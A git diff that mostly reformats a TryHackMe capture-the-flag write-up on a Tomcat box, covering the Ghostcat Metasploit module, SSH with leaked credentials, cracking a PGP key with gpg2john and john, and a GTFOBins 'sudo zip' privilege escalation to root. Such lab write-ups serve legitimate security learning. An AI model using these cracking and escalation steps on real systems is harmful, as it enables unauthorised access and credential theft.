@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="tomcat.jpeg" width=200 height=200 alt="tomcat">
+{{< post-img src="tomcat.jpeg" alt="tomcat" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT     STATE    SERVICE       REASON      VERSION
 22/tcp   open     ssh           syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -40,7 +38,7 @@ Apache tomcat server on port 8080 but no website is setup?
 
 we search an exploit and with metasploit we use this
 
-```
+```bash
 msf6 auxiliary(admin/http/tomcat_ghostcat) > run
 [*] Running module against 10.10.212.86
 Status Code: 200
@@ -95,42 +93,36 @@ ssh port open maybe we can ssh with those
 
 bingo!
 
-```
+```bash
 skyfuck@ubuntu:~$ whoami
 skyfuck
 ```
 
 we go straight home and find two folders
-
 user merlin got our user flag
 
-```
+```bash
 THM{tomcat_is_dead}
 ```
 
-## Priviledge Escalation
+## Privilege Escalation
 
 The second folder have two files pgp and asc files
-
 Might be key for decryption and privileges escalation?
-
 I want those files...so I get them
-
 I scp the whole skyfck folder from another terminal with
 
 `scp -r skyfuck@10.10.152.29:/home/skyfuck .`
 
 Time to crack that pgp
-
-Tried to import the key but it asked for secret wordpass...wich I do not have
-
+Tried to import the key but it asked for secret wordpass...which I do not have
 So we do some magic
 
 `gpg2john tryhackme.asc > tryhackme.john`
 
 its always rockyou.txt
 
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.john
 Using default input encoding: UTF-8
 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
@@ -149,7 +141,7 @@ alexandru? what a passphrase
 
 Anyway where were we?
 
-```
+```bash
 gpg --import tryhackme.asc
 
 gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
@@ -163,7 +155,7 @@ gpg: clefs secrètes importées : 1
 
 we check if its imported
 
-```
+```bash
 gpg --list-secret-keys
 /home/my_username/.gnupg/pubring.kbx
 
@@ -182,9 +174,9 @@ ssb elg1024 2020-03-11 [E]
 
 indeed..now we decrypt and output to a txt file
 
-it tell us the ELG encrption method is unknown but anyway we cracked it
+it tell us the ELG encryption method is unknown but anyway we cracked it
 
-```
+```bash
 $gpg --output ./decrypted_credentials.txt --decrypt ./credential.pgp
 gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
 dans les préférences du destinataire
@@ -200,7 +192,7 @@ Dafuk is that password? that boy merlin got issues
 
 lateral movement to merlin and sudo rights
 
-```
+```bash
 skyfuck@ubuntu:~$ su merlin
 Password:
 merlin@ubuntu:/home/skyfuck$
@@ -215,13 +207,13 @@ User merlin may run the following commands on ubuntu:
 
 Lets ask gtfobins how to abuse this for shell spawn`
 
-```
+```bash
 TF=$(mktemp -u)
 sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF
 ```
 
-```
+```bash
 merlin@ubuntu:~$ zip
 Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
 Zip 3.0 (July 5th 2008). Usage:
@@ -247,10 +239,9 @@ If zipfile and list are omitted, zip compresses stdin to stdout.
 ```
 
 Technically we can abuse the `-T` flag that test a zip file integrity by running `--unzip-commands`
-
 we create somefile and use `1` to zip faster
 
-```
+```bash
 merlin@ubuntu:~$ touch somefile.txt
 merlin@ubuntu:~$ ls
 somefile.txt user.txt
@@ -262,14 +253,14 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Now we get our flag
 
-```
+```bash
 root@ubuntu:/root# cat root.txt
 THM{tomcat_ghost}
 ```
 
 we find another `ufw` folder with a sh script
 
-```
+```bash
 root@ubuntu:/root# cd ufw
 root@ubuntu:/root/ufw# ls
 ufw.sh
@@ -278,5 +269,4 @@ Firewall stopped and disabled on system startup
 ```
 
 lol ok we control the firewall
-
 nice room
